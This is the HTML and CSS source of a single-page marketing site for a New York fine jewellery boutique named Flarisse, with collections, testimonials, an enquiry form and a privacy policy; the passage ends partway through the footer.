<!DOCTYPE html>
<html lang="en">
<head>
  <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-S2D89C6DWK"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-S2D89C6DWK');
</script>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Flarisse | Fine Jewellery Crafted for Life's Precious Moments</title>
<meta name="description" content="Flarisse — timeless fine jewellery collections crafted with exceptional artistry. Explore diamond rings, gold necklaces, bracelets, earrings and bridal collections. New York, USA.">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,500;0,600;0,700;0,800;1,400;1,600&family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
<style>
  :root{
    --parchment:#F2ECDF;
    --parchment-deep:#E9E0CC;
    --ink:#1C1712;
    --oxblood:#5C1620;
    --oxblood-deep:#3E0F16;
    --brass:#A9834E;
    --brass-light:#CBA76B;
    --forest:#22331F;
    --text-soft:#5C5648;
    --serif:'Playfair Display', serif;
    --sans:'Poppins', sans-serif;
    --rule: rgba(28,23,18,0.15);
  }
  *{margin:0;padding:0;box-sizing:border-box;}
  html{scroll-behavior:smooth;}
  body{
    font-family:var(--sans);
    background:var(--parchment);
    color:var(--ink);
    overflow-x:hidden;
    -webkit-font-smoothing:antialiased;
  }
  a{text-decoration:none;color:inherit;}
  ul{list-style:none;}
  img{max-width:100%;display:block;}
  button{font-family:var(--sans);cursor:pointer;border:none;background:none;}
  ::selection{background:var(--oxblood);color:var(--parchment);}

  .lot-num{
    font-family:var(--serif);font-style:italic;font-weight:600;
    font-size:.95rem;color:var(--brass);letter-spacing:.04em;
  }
  .eyebrow{
    font-family:var(--sans);letter-spacing:.28em;text-transform:uppercase;
    font-size:.68rem;color:var(--brass);font-weight:500;
  }
  .section-heading{
    font-family:var(--serif);font-weight:600;font-size:clamp(2rem,4vw,3.1rem);
    line-height:1.16;margin-top:.5rem;color:var(--ink);
  }
  .section-sub{
    font-family:var(--sans);font-weight:300;color:var(--text-soft);
    max-width:600px;line-height:1.85;font-size:1rem;margin-top:1rem;
  }
  .section-head{max-width:720px;margin:0 auto 3.6rem;}
  .section-head.center{text-align:center;}
  .rule{width:100%;height:1px;background:var(--rule);margin:1.4rem 0;}
  .rule.short{width:70px;height:2px;background:var(--brass);}
  .section-head.center .rule.short{margin-left:auto;margin-right:auto;}

  .container{max-width:1280px;margin:0 auto;padding:0 6vw;}
  section{padding:7rem 0;}
  @media(max-width:768px){section{padding:4rem 0;}}

  .reveal{opacity:0;transform:translateY(24px);transition:opacity .9s ease, transform .9s ease;}
  .reveal.in{opacity:1;transform:translateY(0);}

  /* ===== TICKER ===== */
  .ticker-bar{
    background:var(--ink);color:var(--brass-light);
    font-size:.7rem;letter-spacing:.22em;text-transform:uppercase;
    padding:.55rem 0;overflow:hidden;white-space:nowrap;position:relative;z-index:1001;
  }
  .ticker-track{display:inline-block;padding-left:100%;animation:ticker 26s linear infinite;}
  .ticker-track span{margin:0 2.5rem;}
  @keyframes ticker{from{transform:translateX(0);}to{transform:translateX(-100%);}}

  /* ===== HEADER ===== */
  header{
    position:fixed;top:28px;left:0;width:100%;z-index:1000;
    padding:1.4rem 0;transition:background .5s ease, padding .5s ease, top .3s ease, box-shadow .5s ease;
  }
  header.scrolled{
    background:rgba(242,236,223,.94);backdrop-filter:blur(12px);
    padding:.85rem 0;box-shadow:0 1px 0 var(--rule);top:0;
  }
  .nav-wrap{max-width:1280px;margin:0 auto;padding:0 6vw;display:flex;align-items:center;justify-content:space-between;}
  .logo{font-family:var(--serif);font-size:1.5rem;letter-spacing:.05em;color:black;font-weight:700;transition:color .5s ease;}
  .logo em{font-style:italic;color:var(--brass-light);}
  header.scrolled .logo{color:var(--ink);}
  header.scrolled .logo em{color:var(--oxblood);}

  .nav-links{display:flex;gap:2.3rem;align-items:center;}
  .nav-links a{font-size:.82rem;letter-spacing:.05em;color:black;font-weight:400;position:relative;padding-bottom:4px;transition:color .5s ease;}
  header.scrolled .nav-links a{color:var(--ink);}
  .nav-links a::after{content:'';position:absolute;left:0;bottom:0;width:0;height:1px;background:var(--brass);transition:width .35s ease;}
  .nav-links a:hover::after{width:100%;}
  .nav-links a:hover{color:var(--brass-light);}
  header.scrolled .nav-links a:hover{color:var(--oxblood);}

  .nav-cta{border:1px solid var(--brass);color:black!important;padding:.55rem 1.3rem;font-size:.76rem;letter-spacing:.06em;transition:.4s ease;}
  header.scrolled .nav-cta{color:var(--ink)!important;border-color:var(--oxblood);}
  .nav-cta:hover{background:var(--brass);color:var(--ink)!important;}
  header.scrolled .nav-cta:hover{background:var(--oxblood);color:var(--parchment)!important;}

  .menu-toggle{display:none;flex-direction:column;gap:5px;width:26px;}
  .menu-toggle span{height:1px;width:100%;background:var(--parchment);transition:.4s;}
  header.scrolled .menu-toggle span{background:var(--ink);}

  @media(max-width:920px){
    .nav-links{position:fixed;top:0;right:-100%;height:100vh;width:min(78vw,340px);background:var(--oxblood-deep);flex-direction:column;justify-content:center;gap:2.1rem;transition:right .5s cubic-bezier(.77,0,.18,1);}
    .nav-links.open{right:0;}
    .nav-links a{color:var(--parchment)!important;font-size:1rem;}
    .nav-cta{color:var(--brass-light)!important;border-color:var(--brass-light);}
    .menu-toggle{display:flex;z-index:1001;}
  }

  /* ===== HERO — split editorial ===== */
  .hero{position:relative;display:grid;grid-template-columns:1.15fr .85fr;min-height:100vh;}
  .hero-img{
    background:linear-gradient(180deg, rgba(28,23,18,.15), rgba(28,23,18,.5)),
      url('banner.jpg') center/cover no-repeat;
  }
  .hero-panel{
    background:var(--oxblood-deep);color:var(--parchment);
    display:flex;flex-direction:column;justify-content:center;
    padding:8vw 4.5vw;position:relative;
  }
  .hero-panel::before{
    content:'';position:absolute;left:0;top:14%;bottom:14%;width:1px;background:rgba(203,167,107,.4);
  }
  .hero-tag{font-family:var(--serif);font-style:italic;font-size:.85rem;color:var(--brass-light);letter-spacing:.06em;margin-bottom:1.6rem;padding-left:2rem;}
  .hero h1{
    font-family:var(--serif);font-size:clamp(2.1rem,4.4vw,3.3rem);line-height:1.16;font-weight:700;
    padding-left:2rem;margin-bottom:1.6rem;
  }
  .hero p{
    font-weight:300;font-size:1rem;line-height:1.9;color:rgba(242,236,223,.75);
    padding-left:2rem;max-width:460px;margin-bottom:2.4rem;
  }
  .btn-row{display:flex;gap:1rem;flex-wrap:wrap;padding-left:2rem;}
  .btn{padding:.95rem 2rem;font-size:.76rem;letter-spacing:.1em;text-transform:uppercase;transition:.4s ease;display:inline-block;border:1px solid transparent;}
  .btn-primary{background:var(--brass);color:var(--ink);}
  .btn-primary:hover{background:var(--brass-light);}
  .btn-outline{border:1px solid rgba(242,236,223,.5);color:var(--parchment);}
  .btn-outline:hover{border-color:var(--brass-light);color:var(--brass-light);}
  .hero-est{
    position:absolute;bottom:2.6rem;left:2rem+2rem;padding-left:2rem;
    font-size:.68rem;letter-spacing:.2em;color:rgba(242,236,223,.4);text-transform:uppercase;
  }
  @media(max-width:920px){
    .hero{grid-template-columns:1fr;}
    .hero-img{min-height:44vh;}
    .hero-panel{padding:3.4rem 6vw 4rem;}
    .hero-tag,.hero h1,.hero p,.btn-row{padding-left:0;}
    .hero-panel::before{display:none;}
    .hero-est{position:static;margin-top:2.4rem;padding-left:0;}
  }

  /* ===== ABOUT ===== */
  .about{background:var(--parchment);}
  .about-grid{display:grid;grid-template-columns:.42fr .58fr;gap:0;align-items:stretch;}
  .about-img{position:relative;overflow:hidden;}
  .about-img img{width:100%;height:100%;object-fit:cover;min-height:520px;}
  .about-text{
    background:var(--parchment-deep);padding:5rem 4.5vw;display:flex;flex-direction:column;justify-content:center;
    border-top:1px solid var(--rule);border-bottom:1px solid var(--rule);
  }
  .stats-row{display:flex;gap:0;margin-top:2.6rem;border-top:1px solid var(--rule);}
  .stat{flex:1;padding:1.6rem 1rem 0 0;border-right:1px solid var(--rule);}
  .stat:last-child{border-right:none;}
  .stat b{font-family:var(--serif);font-size:1.7rem;color:var(--oxblood);display:block;font-weight:700;}
  .stat span{font-size:.72rem;color:var(--text-soft);letter-spacing:.02em;display:block;margin-top:.3rem;line-height:1.4;}
  @media(max-width:900px){
    .about-grid{grid-template-columns:1fr;}
    .about-img img{min-height:340px;}
    .stats-row{flex-wrap:wrap;}
    .stat{flex:1 1 50%;border-right:none;border-bottom:1px solid var(--rule);padding-bottom:1.2rem;margin-bottom:1.2rem;}
  }

  /* ===== COLLECTIONS — catalogue list ===== */
  .collections{background:var(--parchment);}
  .lot-row{
    display:grid;grid-template-columns:110px 240px 1fr auto;gap:2.6rem;align-items:center;
    padding:2.4rem 0;border-top:1px solid var(--rule);
  }
  .lot-row:last-child{border-bottom:1px solid var(--rule);}
  .lot-thumb{width:100%;height:150px;overflow:hidden;position:relative;}
  .lot-thumb img{width:100%;height:100%;object-fit:cover;transition:transform .9s cubic-bezier(.2,.8,.2,1);}
  .lot-row:hover .lot-thumb img{transform:scale(1.07);}
  .lot-info h3{font-family:var(--serif);font-size:1.5rem;font-weight:600;margin-bottom:.55rem;}
  .lot-info p{font-size:.9rem;color:var(--text-soft);line-height:1.75;font-weight:300;max-width:480px;}
  .lot-meta{font-size:.7rem;letter-spacing:.1em;text-transform:uppercase;color:var(--brass);margin-top:.7rem;}
  .lot-cta{
    font-size:.76rem;letter-spacing:.1em;text-transform:uppercase;color:var(--ink);
    padding-bottom:4px;border-bottom:1px solid var(--ink);white-space:nowrap;
    transition:.35s ease;position:relative;
  }
  .lot-row:hover .lot-cta{color:var(--oxblood);border-color:var(--oxblood);}
  @media(max-width:900px){
    .lot-row{grid-template-columns:60px 1fr;grid-template-rows:auto auto;column-gap:1.4rem;}
    .lot-thumb{grid-column:2;grid-row:1;height:200px;order:1;}
    .lot-num{grid-column:1;grid-row:1;}
    .lot-info{grid-column:1/-1;grid-row:2;margin-top:1.2rem;}
    .lot-cta{grid-column:1/-1;grid-row:3;margin-top:1rem;display:inline-block;}
  }

  /* ===== WHY CHOOSE US — dark ledger ===== */
  .why{background:var(--ink);color:var(--parchment);}
  .why .eyebrow{color:var(--brass-light);}
  .why .section-heading{color:var(--parchment);}
  .why .section-sub{color:rgba(242,236,223,.6);}
  .why-list{border-top:1px solid rgba(203,167,107,.25);}
  .why-item{
    display:grid;grid-template-columns:70px 1fr;gap:2rem;padding:1.9rem 0;
    border-bottom:1px solid rgba(203,167,107,.2);
    transition:padding-left .4s ease;
  }
  .why-item:hover{padding-left:.8rem;}
  .why-item .lot-num{color:var(--brass-light);}
  .why-item h3{font-family:var(--serif);font-size:1.15rem;font-weight:600;margin-bottom:.4rem;}
  .why-item p{font-size:.87rem;color:rgba(242,236,223,.55);line-height:1.7;font-weight:300;max-width:560px;}

  /* ===== PROMISE ===== */
  .promise{background:var(--forest);color:var(--parchment);}
  .promise .eyebrow{color:var(--brass-light);}
  .promise .section-heading{color:var(--parchment);}
  .promise .section-sub{color:rgba(242,236,223,.62);}
  .promise-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:1px;background:rgba(203,167,107,.25);border:1px solid rgba(203,167,107,.25);}
  .promise-card{background:#1b2919;padding:2.6rem 2.2rem;transition:background .4s ease;}
  .promise-card:hover{background:#25361f;}
  .promise-card h3{font-family:var(--serif);font-size:1.1rem;margin:.4rem 0 .7rem;font-weight:600;color:var(--parchment);}
  .promise-card p{font-size:.85rem;color:rgba(242,236,223,.55);line-height:1.7;font-weight:300;}
  @media(max-width:900px){.promise-grid{grid-template-columns:1fr 1fr;}}
  @media(max-width:600px){.promise-grid{grid-template-columns:1fr;}}

  /* ===== GALLERY ===== */
  .gallery{background:var(--parchment);}
  .gallery-grid{display:grid;grid-template-columns:repeat(6,1fr);grid-auto-rows:130px;gap:.9rem;}
  .g1{grid-column:span 3;grid-row:span 3;}
  .g2{grid-column:span 3;grid-row:span 2;}
  .g3{grid-column:span 2;grid-row:span 2;}
  .g4{grid-column:span 2;grid-row:span 2;}
  .g5{grid-column:span 2;grid-row:span 2;}
  .g6{grid-column:span 3;grid-row:span 2;}
  .gallery-item{position:relative;overflow:hidden;}
  .gallery-item img{width:100%;height:100%;object-fit:cover;transition:transform .8s ease, filter .5s ease;filter:grayscale(45%);}
  .gallery-item:hover img{transform:scale(1.06);filter:grayscale(0%);}
  .gallery-label{
    position:absolute;left:0;bottom:0;right:0;padding:.9rem 1.1rem;
    background:linear-gradient(0deg, rgba(28,23,18,.85), transparent);
    color:var(--parchment);font-size:.7rem;letter-spacing:.14em;text-transform:uppercase;
  }
  @media(max-width:768px){
    .gallery-grid{grid-template-columns:repeat(2,1fr);grid-auto-rows:180px;}
    .g1,.g2,.g3,.g4,.g5,.g6{grid-column:span 1;grid-row:span 1;}
  }

  /* ===== TESTIMONIALS — marginalia ===== */
  .testimonials{background:var(--parchment-deep);}
  .test-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border-top:1px solid var(--rule);}
  .test-card{padding:2.2rem 1.7rem;border-right:1px solid var(--rule);position:relative;}
  .test-card:last-child{border-right:none;}
  .test-quote-mark{font-family:var(--serif);font-size:2.6rem;color:var(--brass);line-height:1;font-style:italic;margin-bottom:.6rem;}
  .test-card p{font-family:var(--serif);font-style:italic;font-size:.98rem;line-height:1.7;color:var(--ink);margin-bottom:1.4rem;}
  .test-name{font-size:.78rem;letter-spacing:.04em;font-weight:600;}
  .test-loc{font-size:.7rem;color:var(--text-soft);margin-top:.2rem;}
  @media(max-width:900px){
    .test-grid{grid-template-columns:1fr 1fr;}
    .test-card{border-bottom:1px solid var(--rule);}
  }
  @media(max-width:560px){.test-grid{grid-template-columns:1fr;}}

  /* ===== CONTACT ===== */
  .contact{background:var(--ink);color:var(--parchment);}
  .contact-grid{display:grid;grid-template-columns:.8fr 1.2fr;gap:5rem;}
  .contact-info .eyebrow{color:var(--brass-light);}
  .contact-info h2{color:var(--parchment);}
  .info-list{margin-top:2.2rem;border-top:1px solid rgba(203,167,107,.25);}
  .info-item{display:grid;grid-template-columns:90px 1fr;gap:1rem;padding:1.4rem 0;border-bottom:1px solid rgba(203,167,107,.2);}
  .info-item b{font-size:.68rem;letter-spacing:.1em;text-transform:uppercase;color:var(--brass-light);}
  .info-item span{font-size:.86rem;color:rgba(242,236,223,.65);line-height:1.6;font-weight:300;}

  .contact-form{background:rgba(242,236,223,.04);border:1px solid rgba(203,167,107,.3);padding:2.6rem;}
  .form-row{display:grid;grid-template-columns:1fr 1fr;gap:1.2rem;}
  .field{margin-bottom:1.3rem;}
  .field label{display:block;font-size:.68rem;letter-spacing:.1em;text-transform:uppercase;color:rgba(242,236,223,.5);margin-bottom:.5rem;}
  .field input, .field textarea{
    width:100%;background:transparent;border:none;border-bottom:1px solid rgba(203,167,107,.4);
    color:var(--parchment);font-family:var(--sans);font-size:.94rem;padding:.6rem 0;transition:border-color .35s ease;
  }
  .field input:focus, .field textarea:focus{outline:none;border-color:var(--brass);}
  .field textarea{resize:vertical;min-height:90px;}
  .form-note{font-size:.74rem;color:rgba(242,236,223,.4);margin-top:1rem;font-weight:300;}
  @media(max-width:900px){.contact-grid{grid-template-columns:1fr;gap:3rem;}.form-row{grid-template-columns:1fr;}}

  /* ===== PRIVACY ===== */
  .privacy{background:var(--parchment);}
  .privacy .container{max-width:900px;}
  .privacy-block{margin-bottom:2.3rem;border-bottom:1px solid var(--rule);padding-bottom:2.3rem;}
  .privacy-block:last-child{border-bottom:none;}
  .privacy-block h3{font-family:var(--serif);font-size:1.15rem;margin-bottom:.7rem;color:var(--ink);}
  .privacy-block p, .privacy-block li{font-size:.9rem;color:var(--text-soft);line-height:1.85;font-weight:300;}
  .privacy-block ul{margin-top:.6rem;padding-left:1.2rem;}
  .privacy-block li{list-style:disc;margin-bottom:.4rem;}

  /* ===== FOOTER ===== */
  footer{background:var(--oxblood-deep);color:rgba(242,236,223,.7);padding:4.6rem 0 2rem;}
  .footer-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr 1.2fr;gap:3rem;padding-bottom:3rem;border-bottom:1px solid rgba(203,167,107,.25);}
  .footer-logo{font-family:var(--serif);font-size:1.5rem;color:var(--parchment);font-weight:700;margin-bottom:1rem;}
  .footer-logo em{font-style:italic;color:var(--brass-light);}
  .footer-col h4{font-size:.72rem;letter-spacing:.14em;text-transform:uppercase;color:var(--brass-light);margin-bottom:1.3rem;}
  .footer-col ul li{margin-bottom:.7rem;}
  .footer-col ul li a{font-size:.86rem;transition:color .3s ease;}
  .footer-col ul li a:hover{color:var(--brass-light);}
  .footer-desc{font-size:.85rem;line-height:1.8;font-weight:300;max-width:280px;color:rgba(242,236,223,.55);}
  .social-row{display:flex;gap:.9rem;margin-top:1.4rem;}
  .social-row a{width:36px;height:36px;border:1px solid rgba(203,167,107,.4);border-radius:50%;display:flex;align-items:center;justify-content:center;transition:.35s ease;}
  .social-row a:hover{background:var(--brass);border-color:var(--brass);}
  .social-row a svg{width:15px;height:15px;stroke:var(--brass-light);transition:.35s;}
  .social-row a:hover svg{stroke:var(--ink);}
  .footer-bottom{display:flex;justify-content:space-between;align-items:center;padding-top:1.7rem;font-size:.78rem;color:rgba(242,236,223,.45);flex-wrap:wrap;gap:1rem;}
  .footer-bottom a:hover{color:var(--brass-light);}
  @media(max-width:900px){.footer-grid{grid-template-columns:1fr 1fr;}}
  @media(max-width:560px){.footer-grid{grid-template-columns:1fr;}.footer-bottom{flex-direction:column;text-align:center;}}

  .to-top{
    position:fixed;bottom:2rem;right:2rem;width:44px;height:44px;border-radius:50%;
    background:var(--ink);border:1px solid var(--brass);display:flex;align-items:center;justify-content:center;
    opacity:0;pointer-events:none;transition:.4s ease;z-index:900;
  }
  .to-top.show{opacity:1;pointer-events:auto;}
  .to-top svg{width:17px;height:17px;stroke:var(--brass-light);}
  .to-top:hover{background:var(--brass);}
  .to-top:hover svg{stroke:var(--ink);}
</style>
</head>
<body>

<div class="ticker-bar">
  <div class="ticker-track">
    <span>PRIVATE VIEWINGS BY APPOINTMENT</span>
    <span>·</span><span>CERTIFIED PROVENANCE ON EVERY PIECE</span>
    <span>·</span><span>ESTABLISHED IN NEW YORK</span>
    <span>·</span><span>LIFETIME CRAFTSMANSHIP GUARANTEE</span>
    <span>·</span><span>PRIVATE VIEWINGS BY APPOINTMENT</span>
    <span>·</span><span>CERTIFIED PROVENANCE ON EVERY PIECE</span>
    <span>·</span><span>ESTABLISHED IN NEW YORK</span>
    <span>·</span><span>LIFETIME CRAFTSMANSHIP GUARANTEE</span>
  </div>
</div>

<header id="siteHeader">
  <div class="nav-wrap">
    <a href="#home" class="logo">FLAR<em>ISSE</em></a>
    <nav>
      <ul class="nav-links" id="navLinks">
        <li><a href="#home">Home</a></li>
        <li><a href="#about">About</a></li>
        <li><a href="#collections">Collections</a></li>
        <li><a href="#why">Why Choose Us</a></li>
        <li><a href="#contact">Contact</a></li>
        <li><a href="#contact" class="nav-cta">Enquire Now</a></li>
      </ul>
    </nav>
    <button class="menu-toggle" id="menuToggle" aria-label="Toggle menu"><span></span><span></span><span></span></button>
  </div>
</header>

<!-- ===== HERO ===== -->
<section class="hero" id="home">
  <div class="hero-img"></div>
  <div class="hero-panel">
    <p class="hero-tag">Flarisse — Est. New York</p>
    <h1>Refined Elegance for Every Occasion</h1>
    <p>Experience luxury jewellery designed with timeless elegance and expert craftsmanship.</p>
    <div class="btn-row">
      <a href="#collections" class="btn btn-primary">Explore Collection</a>
      <a href="#contact" class="btn btn-outline">Enquire Now</a>
    </div>
  </div>
</section>

<!-- ===== ABOUT ===== -->
<section class="about" id="about">
  <div class="container">
    <div class="about-grid reveal">
      <div class="about-img">
        <img src="about.jpg" alt="Artisan hands crafting fine jewellery at Flarisse atelier">
      </div>
      <div class="about-text">
        <p class="eyebrow">About Flarisse</p>
        <h2 class="section-heading">Where Craftsmanship Meets Timeless Beauty</h2>
        <p class="section-sub">For generations, Flarisse has been dedicated to creating fine jewellery that blends exceptional craftsmanship with timeless elegance. Every piece is carefully designed using premium materials and meticulous attention to detail, resulting in jewellery that celebrates life's most cherished moments.</p>
        <div class="stats-row">
          <div class="stat"><b>25+</b><span>Years of Excellence</span></div>
          <div class="stat"><b>8,000+</b><span>Happy Clients</span></div>
          <div class="stat"><b>100%</b><span>Certified Jewellery</span></div>
          <div class="stat"><b>Lifetime</b><span>Craftsmanship Guarantee</span></div>
        </div>
      </div>
    </div>
  </div>
</section>

<!-- ===== FEATURED COLLECTIONS — catalogue ===== -->
<section class="collections" id="collections">
  <div class="container">
    <div class="section-head reveal">
      <p class="eyebrow">Featured Collections</p>
      <h2 class="section-heading">The Present Catalogue</h2>
      <div class="rule short"></div>
    </div>

    <div class="lot-row reveal">
      <div class="lot-num">LOT 01</div>
      <div class="lot-thumb"><img src="ring.png" alt="Diamond ring collection"></div>
      <div class="lot-info">
        <h3>Diamond Rings</h3>
        <p>Brilliant-cut diamonds set in hand-finished bands, designed to mark your most defining moments.</p>
        <div class="lot-meta">18K Gold · GIA Certified Stones</div>
      </div>
      <a href="#contact" class="lot-cta">Enquire Now →</a>
    </div>

    <div class="lot-row reveal">
      <div class="lot-num">LOT 02</div>
      <div class="lot-thumb"><img src="Necklaces.png" alt="Gold necklace collection"></div>
      <div class="lot-info">
        <h3>Gold Necklaces</h3>
        <p>Fluid, luminous gold designs layered with heritage technique for an everyday sense of occasion.</p>
        <div class="lot-meta">22K & 18K Gold · Handfinished</div>
      </div>
      <a href="#contact" class="lot-cta">Enquire Now →</a>
    </div>

    <div class="lot-row reveal">
      <div class="lot-num">LOT 03</div>
      <div class="lot-thumb"><img src="Bracelets.png" alt="Luxury bracelet collection"></div>
      <div class="lot-info">
        <h3>Luxury Bracelets</h3>
        <p>Articulated links and pavé detailing, balanced for both bold statement and quiet refinement.</p>
        <div class="lot-meta">Platinum & Gold · Pavé Set</div>
      </div>
      <a href="#contact" class="lot-cta">Enquire Now →</a>
    </div>

    <div class="lot-row reveal">
      <div class="lot-num">LOT 04</div>
      <div class="lot-thumb"><img src="Earrings.png" alt="Diamond earrings collection"></div>
      <div class="lot-info">
        <h3>Diamond Earrings</h3>
        <p>From delicate studs to cascading drops, cut and set to catch the light with every movement.</p>
        <div class="lot-meta">18K Gold · VS Clarity Diamonds</div>
      </div>
      <a href="#contact" class="lot-cta">Enquire Now →</a>
    </div>

  </div>
</section>

<!-- ===== WHY CHOOSE US ===== -->
<section class="why" id="why">
  <div class="container">
    <div class="section-head reveal">
      <p class="eyebrow">Why Choose Us</p>
      <h2 class="section-heading">The Flarisse Standard</h2>
      <div class="rule short"></div>
    </div>
    <div class="why-list reveal">
      <div class="why-item"><div class="lot-num">01</div><div><h3>Certified Fine Jewellery</h3><p>Every diamond and gemstone is independently certified for authenticity, clarity, and quality.</p></div></div>
      <div class="why-item"><div class="lot-num">02</div><div><h3>Ethically Sourced Materials</h3><p>Our gold and gemstones are responsibly sourced, honouring both craft and conscience.</p></div></div>
      <div class="why-item"><div class="lot-num">03</div><div><h3>Master Craftsmanship</h3><p>Each piece passes through the hands of master jewellers trained in traditional technique.</p></div></div>
      <div class="why-item"><div class="lot-num">04</div><div><h3>Custom Jewellery Design</h3><p>Work with our design atelier to create a bespoke piece built entirely around you.</p></div></div>
      <div class="why-item"><div class="lot-num">05</div><div><h3>Lifetime Care & Support</h3><p>Complimentary cleaning, inspection, and restoration for as long as you own the piece.</p></div></div>
      <div class="why-item"><div class="lot-num">06</div><div><h3>Secure Worldwide Shipping</h3><p>Insured, discreet delivery with full tracking, wherever your journey takes you.</p></div></div>
    </div>
  </div>
</section>

<!-- ===== OUR PROMISE ===== -->
<section class="promise" id="promise">
  <div class="container">
    <div class="section-head reveal">
      <p class="eyebrow">Our Promise</p>
      <h2 class="section-heading">A Standard We Never Compromise</h2>
      <div class="rule short"></div>
    </div>
    <div class="promise-grid">
      <div class="promise-card reveal"><div class="lot-num">I</div><h3>Authentic Materials</h3><p>Only genuine diamonds, gemstones, and precious metals, verified at every stage.</p></div>
      <div class="promise-card reveal"><div class="lot-num">II</div><h3>Exceptional Quality</h3><p>Rigorous inspection at every stage of the crafting process, without exception.</p></div>
      <div class="promise-card reveal"><div class="lot-num">III</div><h3>Timeless Designs</h3><p>Pieces designed to transcend trends, worn and treasured for generations.</p></div>
      <div class="promise-card reveal"><div class="lot-num">IV</div><h3>Personalized Service</h3><p>Dedicated consultation to guide you toward a piece that feels entirely yours.</p></div>
      <div class="promise-card reveal"><div class="lot-num">V</div><h3>Trusted Craftsmanship</h3><p>Generations of jewellery-making expertise behind every finished piece.</p></div>
      <div class="promise-card reveal"><div class="lot-num">VI</div><h3>Customer Satisfaction</h3><p>Our relationship continues well beyond the sale, with care built to last.</p></div>
    </div>
  </div>
</section>



<!-- ===== TESTIMONIALS ===== -->
<section class="testimonials" id="testimonials">
  <div class="container">
    <div class="section-head reveal">
      <p class="eyebrow">Testimonials</p>
      <h2 class="section-heading">Cherished by Our Clients</h2>
      <div class="rule short"></div>
    </div>
    <div class="test-grid reveal">
      <div class="test-card">
        <div class="test-quote-mark">"</div>
        <p>The craftsmanship exceeded every expectation. My engagement ring is even more beautiful in person.</p>
        <div class="test-name">Amanda Reyes</div><div class="test-loc">New York, NY</div>
      </div>
      <div class="test-card">
        <div class="test-quote-mark">"</div>
        <p>From consultation to delivery, Flarisse made the entire experience feel personal and special.</p>
        <div class="test-name">Michael Bennett</div><div class="test-loc">Boston, MA</div>
      </div>
      <div class="test-card">
        <div class="test-quote-mark">"</div>
        <p>The necklace I received is a true heirloom piece. The attention to detail is unmatched.</p>
        <div class="test-name">Sophia Turner</div><div class="test-loc">Miami, FL</div>
      </div>
      <div class="test-card">
        <div class="test-quote-mark">"</div>
        <p>Elegant, timeless, and beautifully packaged. Flarisse has earned a client for life.</p>
        <div class="test-name">Daniel Cho</div><div class="test-loc">San Francisco, CA</div>
      </div>
    </div>
  </div>
</section>

<!-- ===== CONTACT ===== -->
<section class="contact" id="contact">
  <div class="container contact-grid">
    <div class="contact-info reveal">
      <p class="eyebrow">Get in Touch</p>
      <h2 class="section-heading">Begin Your Flarisse Story</h2>
      <p class="section-sub" style="color:rgba(242,236,223,.6);">Share a few details and our jewellery consultants will be in touch to guide you toward the perfect piece.</p>
      <div class="info-list">
        <div class="info-item"><b>Boutique</b><span>522 Fifth Avenue, Manhattan, New York, NY 10018, USA</span></div>
        <div class="info-item"><b>Phone</b><span>+1 (212) 555-0148</span></div>
        <div class="info-item"><b>Hours</b><span>Mon – Sat: 10:00 AM – 7:00 PM · Sun: By Appointment</span></div>
      </div>
    </div>

    <form class="contact-form reveal" id="enquiryForm">
      <div class="form-row">
        <div class="field"><label for="name">Full Name</label><input type="text" id="name" name="name" placeholder="Your name" required></div>
        <div class="field"><label for="phone">Phone</label><input type="tel" id="phone" name="phone" placeholder="Your phone number"></div>
      </div>
      <div class="field"><label for="email">Email</label><input type="email" id="email" name="email" placeholder="you@example.com" required></div>
      <div class="field"><label for="message">Message</label><textarea id="message" name="message" placeholder="Tell us which collection interests you..." required></textarea></div>
      <button type="submit" class="btn btn-primary" style="width:100%;text-align:center;">Enquire Now</button>
      <p class="form-note">This is an enquiry form only. Flarisse does not process online payments or orders through this website.</p>
    </form>
  </div>
</section>

<!-- ===== PRIVACY POLICY ===== -->
<section class="privacy" id="privacy">
  <div class="container">
    <div class="section-head reveal">
      <p class="eyebrow">Legal</p>
      <h2 class="section-heading">Privacy Policy</h2>
      <div class="rule short"></div>
    </div>
    <div class="privacy-block reveal"><h3>Information We Collect</h3><p>When you submit an enquiry through our website, we may collect your name, email address, phone number, and any details you choose to share in your message. We do not collect payment information, as Flarisse does not process online transactions.</p></div>
    <div class="privacy-block reveal"><h3>How We Use Your Information</h3><p>Information submitted is used solely to respond to your enquiry, provide details about our collections, and offer personalized jewellery consultations. We do not sell or rent your personal information to third parties.</p></div>
    <div class="privacy-block reveal"><h3>Cookies</h3><p>Our website may use essential cookies to support basic site functionality, such as remembering navigation preferences. We do not use cookies for third-party advertising purposes.</p></div>
    <div class="privacy-block reveal"><h3>Data Security</h3><p>We employ reasonable administrative and technical safeguards to protect the information you share with us from unauthorized access, disclosure, or misuse.</p></div>
    <div class="privacy-block reveal"><h3>Third-Party Services</h3><p>We may use trusted third-party services, such as email providers, to help us respond to enquiries. These providers are bound to handle your information responsibly and in line with this policy.</p></div>
    <div class="privacy-block reveal"><h3>Your Privacy Rights</h3><ul><li>You may request access to the personal information we hold about you.</li><li>You may request correction or deletion of your personal information.</li><li>You may withdraw consent for future communications at any time.</li></ul></div>
    <div class="privacy-block reveal"><h3>Contact Information</h3><p>For any privacy-related questions, please contact us at +1 (212) 555-0148.</p></div>
  </div>
</section>

<!-- ===== FOOTER ===== -->
<footer>
  <div class="container">
    <div class="footer-grid">
      <div>
        <div class="footer-logo">FLAR<em>ISSE</em></div>
        <p class="footer-desc">Fine jewellery crafted with exceptional artistry and timeless elegance, designed for life's most precious moments.</p>
        <div class="social-row">
          <a href="#" aria-label="Instagram"><svg viewBox="0 0 24 24" fill="none" stroke-width="1.5"><rect x="3" y="3" width="18" height="18" rx="5"/><circle cx="12" cy="12" r="4"/><circle cx="17.5" cy="6.5" r="1"/></svg></a>
          <a href="#" aria-label="Facebook"><svg viewBox="0 0 24 24" fill="none" stroke-width="1.5"><path d="M15 8h2V5h-2a4 4 0 0 0-4 4v2H9v3h2v7h3v-7h2.5l.5-3H14V9a1 1 0 0 1 1-1z"/></svg></a>
